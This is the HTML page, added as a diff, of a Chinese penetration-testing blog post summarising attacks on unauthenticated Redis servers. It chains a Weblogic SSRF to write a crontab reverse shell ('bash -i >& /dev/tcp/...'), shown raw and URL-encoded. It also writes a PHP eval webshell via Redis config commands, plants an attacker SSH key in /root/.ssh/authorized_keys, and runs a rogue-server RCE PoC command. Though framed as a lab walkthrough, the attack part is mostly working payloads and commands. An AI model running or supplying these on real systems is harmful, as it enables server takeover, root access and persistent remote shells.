@@ -1,0 +1,853 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.1">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.png?v=7.4.1">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.png?v=7.4.1">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.1" color="#222">
+  <link rel="alternate" href="/atom.xml" title="C0cho's blog" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.1">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.1',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="Redis未授权访问总结本文主要总结Redis未授权访问漏洞结合Weblogic ssrf攻击Redis（计划任务）开启Weblogic环境docker映射7001和8088端口点击如下功能抓取数据包如下，提示服务存在改变ip，报错，说明存在ssrfdocker开启redis，如此开启后redis与weblogic存在与同一网段">
+<meta name="keywords" content="redis">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Redis未授权访问总结">
+<meta property="og:url" content="https://choge.top/2020/07/26/Redis未授权访问总结/index.html">
+<meta property="og:site_name" content="C0cho&#39;s blog">
+<meta property="og:description" content="Redis未授权访问总结本文主要总结Redis未授权访问漏洞结合Weblogic ssrf攻击Redis（计划任务）开启Weblogic环境docker映射7001和8088端口点击如下功能抓取数据包如下，提示服务存在改变ip，报错，说明存在ssrfdocker开启redis，如此开启后redis与weblogic存在与同一网段">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://choge.top/2020/07/26/Redis未授权访问总结/image-20200728091436973.png">
+<meta property="og:image" content="https://choge.top/2020/07/26/Redis未授权访问总结/image-20200728091503938.png">
+<meta property="og:image" content="https://choge.top/2020/07/26/Redis未授权访问总结/image-20200728091526319.png">
+<meta property="og:image" content="https://choge.top/2020/07/26/Redis未授权访问总结/image-20200728091544876.png">
+<meta property="og:image" content="https://choge.top/2020/07/26/Redis未授权访问总结/image-20200728091605610.png">
+<meta property="og:image" content="https://choge.top/2020/07/26/Redis未授权访问总结/image-20200728091631712.png">
+<meta property="og:image" content="https://choge.top/2020/07/26/Redis未授权访问总结/image-20200728091652185.png">
+<meta property="og:image" content="https://choge.top/2020/07/26/Redis未授权访问总结/image-20200728092013118.png">
+<meta property="og:image" content="https://choge.top/2020/07/26/Redis未授权访问总结/image-20200728092036039.png">
+<meta property="og:image" content="https://choge.top/2020/07/26/Redis未授权访问总结/image-20200728092101840.png">
+<meta property="og:image" content="https://choge.top/2020/07/26/Redis未授权访问总结/image-20200728092123544.png">
+<meta property="og:image" content="https://choge.top/2020/07/26/Redis未授权访问总结/image-20200728092143439.png">
+<meta property="og:image" content="https://choge.top/2020/07/26/Redis未授权访问总结/image-20200728092218583.png">
+<meta property="og:image" content="https://choge.top/2020/07/26/Redis未授权访问总结/image-20200728092241128.png">
+<meta property="og:image" content="https://choge.top/2020/07/26/Redis未授权访问总结/image-20200728092312357.png">
+<meta property="og:image" content="https://choge.top/2020/07/26/Redis未授权访问总结/image-20200728092337138.png">
+<meta property="og:image" content="https://choge.top/2020/07/26/Redis未授权访问总结/image-20200728092401839.png">
+<meta property="og:image" content="https://choge.top/2020/07/26/Redis未授权访问总结/image-20200728092426413.png">
+<meta property="og:image" content="https://choge.top/2020/07/26/Redis未授权访问总结/image-20200728092445066.png">
+<meta property="og:image" content="https://choge.top/2020/07/26/Redis未授权访问总结/image-20200728092501783.png">
+<meta property="og:image" content="https://choge.top/2020/07/26/Redis未授权访问总结/image-20200728092523085.png">
+<meta property="og:image" content="https://choge.top/2020/07/26/Redis未授权访问总结/image-20200728092542588.png">
+<meta property="og:image" content="https://choge.top/2020/07/26/Redis未授权访问总结/image-20200728092603915.png">
+<meta property="og:image" content="https://choge.top/2020/07/26/Redis未授权访问总结/image-20200728092622426.png">
+<meta property="og:image" content="https://choge.top/2020/07/26/Redis未授权访问总结/image-20200728092642782.png">
+<meta property="og:image" content="https://choge.top/2020/07/26/Redis未授权访问总结/image-20200728092701497.png">
+<meta property="og:image" content="https://choge.top/2020/07/26/Redis未授权访问总结/image-20200728092722167.png">
+<meta property="og:updated_time" content="2020-07-28T01:27:39.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Redis未授权访问总结">
+<meta name="twitter:description" content="Redis未授权访问总结本文主要总结Redis未授权访问漏洞结合Weblogic ssrf攻击Redis（计划任务）开启Weblogic环境docker映射7001和8088端口点击如下功能抓取数据包如下，提示服务存在改变ip，报错，说明存在ssrfdocker开启redis，如此开启后redis与weblogic存在与同一网段">
+<meta name="twitter:image" content="https://choge.top/2020/07/26/Redis未授权访问总结/image-20200728091436973.png">
+  <link rel="canonical" href="https://choge.top/2020/07/26/Redis未授权访问总结/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>Redis未授权访问总结 | C0cho's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">C0cho's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">less is more</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+        
+        
+        <li class="menu-item menu-item-home">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-about">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+          
+        
+      
+    
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签<span class="badge">44</span></a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+      
+      
+        
+      
+        
+          
+        
+      
+        
+      
+    
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类<span class="badge">8</span></a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+      
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档<span class="badge">76</span></a>
+
+  </li>
+      
+    
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger">
+          <i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://choge.top/2020/07/26/Redis未授权访问总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="C0cho">
+      <meta itemprop="description" content="记录生活的点点滴滴">
+      <meta itemprop="image" content="/images/author.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="C0cho's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            Redis未授权访问总结
+            
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2020-07-26 22:34:20" itemprop="dateCreated datePublished" datetime="2020-07-26T22:34:20+08:00">2020-07-26</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-07-28 09:27:39" itemprop="dateModified" datetime="2020-07-28T09:27:39+08:00">2020-07-28</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-test/" itemprop="url" rel="index">
+                    <span itemprop="name">Penetration test</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+          
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span>2.2k</span>
+            </span>
+          
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span>2 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="Redis未授权访问总结"><a href="#Redis未授权访问总结" class="headerlink" title="Redis未授权访问总结"></a>Redis未授权访问总结</h2><p>本文主要总结Redis未授权访问漏洞</p><h3 id="结合Weblogic-ssrf攻击Redis（计划任务）"><a href="#结合Weblogic-ssrf攻击Redis（计划任务）" class="headerlink" title="结合Weblogic ssrf攻击Redis（计划任务）"></a>结合Weblogic ssrf攻击Redis（计划任务）</h3><p>开启Weblogic环境</p><p>docker映射7001和8088端口</p><p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728091436973.png" alt="image-20200728091436973"></p><p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728091503938.png" alt="image-20200728091503938"></p><p>点击如下功能</p><p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728091526319.png" alt="image-20200728091526319"></p><p>抓取数据包如下，提示服务存在</p><p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728091544876.png" alt="image-20200728091544876"></p><p>改变ip，报错，说明存在ssrf</p><p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728091605610.png" alt="image-20200728091605610"></p><p>docker开启redis，如此开启后redis与weblogic存在与同一网段</p><a id="more"></a>
+
+
+
+
+
+
+
+
+
+
+
+<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728091631712.png" alt="image-20200728091631712"></p>
+<p>查看redis内部IP地址</p>
+<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728091652185.png" alt="image-20200728091652185"></p>
+<p>通过Weblogic探测Redis，根据返回可知存在Redis</p>
+<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092013118.png" alt="image-20200728092013118"></p>
+<p>构造计划任务数据</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">test</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">set</span> 1 <span class="string">"\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/172.16.49.33/7777 0&gt;&amp;1\n\n\n\n"</span></span><br><span class="line">config <span class="builtin-name">set</span> dir /etc/</span><br><span class="line">config <span class="builtin-name">set</span> dbfilename crontab</span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">aaa</span><br></pre></td></tr></table></figure>
+
+<p>编码后如下</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">201</span>%<span class="number">20</span>%<span class="number">22</span>%<span class="number">5</span>Cn%<span class="number">5</span>Cn%<span class="number">5</span>Cn%<span class="number">5</span>Cn*%<span class="number">20</span>*%<span class="number">20</span>*%<span class="number">20</span>*%<span class="number">20</span>*%<span class="number">20</span>root%<span class="number">20</span>bash%<span class="number">20</span>-i%<span class="number">20</span>%<span class="number">3</span>E%<span class="number">26</span>%<span class="number">20</span>%<span class="number">2</span>Fdev%<span class="number">2</span>Ftcp%<span class="number">2</span>F172<span class="number">.16</span><span class="number">.49</span><span class="number">.33</span>%<span class="number">2</span>F7777%<span class="number">200</span>%<span class="number">3</span>E%<span class="number">261</span>%<span class="number">5</span>Cn%<span class="number">5</span>Cn%<span class="number">5</span>Cn%<span class="number">5</span>Cn%<span class="number">22</span>%<span class="number">0</span>D%<span class="number">0</span>Aconfig%<span class="number">20</span>set%<span class="number">20</span>dir%<span class="number">20</span>%<span class="number">2</span>Fetc%<span class="number">2</span>F%<span class="number">0</span>D%<span class="number">0</span>Aconfig%<span class="number">20</span>set%<span class="number">20</span>dbfilename%<span class="number">20</span>crontab%<span class="number">0</span>D%<span class="number">0</span>Asave%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>Aaaa</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092036039.png" alt="image-20200728092036039"></p>
+<p>bp发送构造的数据包</p>
+<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092101840.png" alt="image-20200728092101840"></p>
+<p>vps设置监听后成功反弹shell</p>
+<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092123544.png" alt="image-20200728092123544"></p>
+<h3 id="未授权访问漏洞测试"><a href="#未授权访问漏洞测试" class="headerlink" title="未授权访问漏洞测试"></a>未授权访问漏洞测试</h3><p>一台开启redis的机器与ip为172.16.49.233进行交互</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-cli -h <span class="number">172.16</span><span class="number">.49</span><span class="number">.233</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092143439.png" alt="image-20200728092143439"></p>
+<p>成功交互</p>
+<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092218583.png" alt="image-20200728092218583"></p>
+<h3 id="redis写webshell"><a href="#redis写webshell" class="headerlink" title="redis写webshell"></a>redis写webshell</h3><p>前提条件：</p>
+<ul>
+<li>靶机redis链接未授权，在攻击机上能用redis-cli连上，如上图，并未登陆验证</li>
+<li>开了web服务器，并且知道路径（如利用phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限 （我们可以将dir设置为一个目录a，而dbfilename为文件名b，再执行save或bgsave，则我们就可以写入一个路径为a/b的任意文件</li>
+</ul>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config <span class="builtin-name">set</span> dir /home/cc</span><br><span class="line">config <span class="builtin-name">set</span> dbfilename redis.php</span><br><span class="line"><span class="builtin-name">set</span> webshell <span class="string">"&lt;?php phpinfo(); ?&gt;"</span>   #此步也可以使用<span class="builtin-name">set</span> x <span class="string">"\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n"</span>  edis写入的文件会自带一些版本信息，如果不换行可能会导致无法执行。</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p>当数据库过大时，redis写shell的小技巧：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">$fp=fopen(<span class="string">'bmjoker.php'</span>,<span class="string">'w'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'&lt;?php @eval($_POST[\"bmjoker\"]);?&gt;'</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="“公私钥”认证获取root权限"><a href="#“公私钥”认证获取root权限" class="headerlink" title="“公私钥”认证获取root权限"></a>“公私钥”认证获取root权限</h3><p>攻击机与靶机开启Redis服务</p>
+<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092241128.png" alt="image-20200728092241128"></p>
+<p>攻击机生成公私钥，密码为空</p>
+<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092312357.png" alt="image-20200728092312357"></p>
+<p>进入.ssh目录</p>
+<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092337138.png" alt="image-20200728092337138"></p>
+<p>将密码保存为fo.txt</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(echo -e <span class="string">"<span class="subst">\n</span><span class="subst">\n</span>"</span>; cat id_rsa.pub; echo -e <span class="string">"<span class="subst">\n</span><span class="subst">\n</span>"</span>) &gt; fo.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092401839.png" alt="image-20200728092401839"></p>
+<p>拷贝redis-cli到/root/.ssh/下</p>
+<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092426413.png" alt="image-20200728092426413"></p>
+<p>靶机需要有.ssh目录，创建目录</p>
+<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092445066.png" alt="image-20200728092445066"></p>
+<p>将保存ssh的公钥1.txt写入redis（使用redis-cli -h ip命令连接靶机，将文件写入）</p>
+<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092501783.png" alt="image-20200728092501783"></p>
+<p>使用<code>redis-cli -h 172.16.49.78</code>远程登录靶机的redis服务，使用<code>config set dir</code>命令得到redis备份的路径：</p>
+<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092523085.png" alt="image-20200728092523085"></p>
+<p>使用<code>config set dir /root/.ssh</code>更改redis备份路径为ssh公钥存放目录，使用<code>config set dbfilename&quot;authorized_keys&quot;</code>设置上传公钥的备份文件名字为authorized_keys</p>
+<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092542588.png" alt="image-20200728092542588"></p>
+<p><code>config get dbfilename</code>检查是否更改成功（查看有没有authorized_keys文件）</p>
+<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092603915.png" alt="image-20200728092603915"></p>
+<p>保存和退出</p>
+<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092622426.png" alt="image-20200728092622426"></p>
+<p><code>ssh -i id_rsa root@172.16.49.78</code>在攻击机上使用ssh免密登录靶机</p>
+<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092642782.png" alt="image-20200728092642782"></p>
+<h3 id="POC脚本"><a href="#POC脚本" class="headerlink" title="POC脚本"></a>POC脚本</h3><p><a href="https://github.com/vulhub/redis-rogue-getshell" target="_blank" rel="noopener">https://github.com/vulhub/redis-rogue-getshell</a></p>
+<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092701497.png" alt="image-20200728092701497"></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 redis-master<span class="selector-class">.py</span> -r target-ip -<span class="selector-tag">p</span> <span class="number">6379</span> -L local-ip -P <span class="number">8888</span> -f RedisModulesSDK/exp<span class="selector-class">.so</span> -c <span class="string">"id"</span></span><br></pre></td></tr></table></figure>
+
+<p>命令执行如下，成功执行id命令</p>
+<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092722167.png" alt="image-20200728092722167"></p>
+<p>其他脚本</p>
+<p><a href="https://github.com/n0b0dyCN/redis-rogue-server" target="_blank" rel="noopener">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
+<p><a href="https://github.com/Ridter/redis-rce" target="_blank" rel="noopener">https://github.com/Ridter/redis-rce</a></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/flokz/p/weblogic_SSRF.html" target="_blank" rel="noopener">https://www.cnblogs.com/flokz/p/weblogic_SSRF.html</a></p>
+<p><a href="https://www.cnblogs.com/bmjoker/p/9548962.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/9548962.html</a></p>
+<p><a href="https://www.cnblogs.com/xiaozi/p/7568272.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaozi/p/7568272.html</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+      
+    </div>
+        
+      
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>C0cho
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://choge.top/2020/07/26/Redis未授权访问总结/" title="Redis未授权访问总结">https://choge.top/2020/07/26/Redis未授权访问总结/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/redis/" rel="tag"># redis</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2020/04/16/Oracle数据库注入总结/" rel="next" title="Oracle数据库注入总结">
+                  <i class="fa fa-chevron-left"></i> Oracle数据库注入总结
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2020/07/26/Solr（CVE-2019-0193）远程命令执行漏洞复现/" rel="prev" title="Solr（CVE-2019-0193）远程命令执行漏洞复现">
+                  Solr（CVE-2019-0193）远程命令执行漏洞复现 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Redis未授权访问总结"><span class="nav-number">1.</span> <span class="nav-text">Redis未授权访问总结</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#结合Weblogic-ssrf攻击Redis（计划任务）"><span class="nav-number">1.1.</span> <span class="nav-text">结合Weblogic ssrf攻击Redis（计划任务）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#未授权访问漏洞测试"><span class="nav-number">1.2.</span> <span class="nav-text">未授权访问漏洞测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#redis写webshell"><span class="nav-number">1.3.</span> <span class="nav-text">redis写webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#“公私钥”认证获取root权限"><span class="nav-number">1.4.</span> <span class="nav-text">“公私钥”认证获取root权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC脚本"><span class="nav-number">1.5.</span> <span class="nav-text">POC脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考"><span class="nav-number">1.6.</span> <span class="nav-text">参考</span></a></li></ol></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/author.jpg"
+      alt="C0cho">
+  <p class="site-author-name" itemprop="name">C0cho</p>
+  <div class="site-description" itemprop="description">记录生活的点点滴滴</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">76</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">44</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+</div>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/yourname" title="GitHub &rarr; https://github.com/yourname" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="mailto:yourname@gmail.com" title="E-Mail &rarr; mailto:yourname@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
